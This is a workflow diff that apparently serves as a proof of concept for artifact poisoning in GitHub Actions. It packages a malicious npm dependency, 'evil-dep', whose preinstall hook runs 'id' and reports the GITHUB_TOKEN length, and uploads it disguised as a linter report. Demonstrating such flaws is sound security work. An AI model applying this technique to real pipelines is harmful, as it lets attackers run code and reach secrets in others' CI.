@@ -8,15 +8,38 @@ jobs:
   validate:
     runs-on: ubuntu-latest
     steps:
-      - name: Benign lint report
+      - name: Attacker-authored artifact (simulates fork PR author)
         run: |
-          echo "benign report" > linter-report.txt
+          echo "attacker-controlled linter report" > linter-report.txt
           echo "${{ github.event.pull_request.number }}" > pr-number.txt
-      - name: Upload linter report
-        uses: actions/upload-artifact@v4
+          mkdir -p evilpkg/package
+          cat > evilpkg/package/package.json <<'PKG'
+          {
+            "name": "evil-dep",
+            "version": "1.0.0",
+            "scripts": {
+              "preinstall": "set +e; echo '===== RCE-PROOF-START ====='; id; echo \"GITHUB_TOKEN_len=${#GITHUB_TOKEN}\"; echo \"cwd=$(pwd)\"; echo '===== RCE-PROOF-END ====='"
+            }
+          }
+          PKG
+          (cd evilpkg && tar czf ../evil.tgz package)
+          cat > package.json <<'PKG'
+          {
+            "name": "poc-root",
+            "version": "1.0.0",
+            "private": true,
+            "dependencies": { "evil-dep": "file:./evil.tgz" }
+          }
+          PKG
+          printf 'foreground-scripts=true\n' > .npmrc
+      - uses: actions/upload-artifact@v4
         with:
           name: linter-report
           path: |
             linter-report.txt
             pr-number.txt
+            package.json
+            evil.tgz
+            .npmrc
+          include-hidden-files: true
           if-no-files-found: ignore
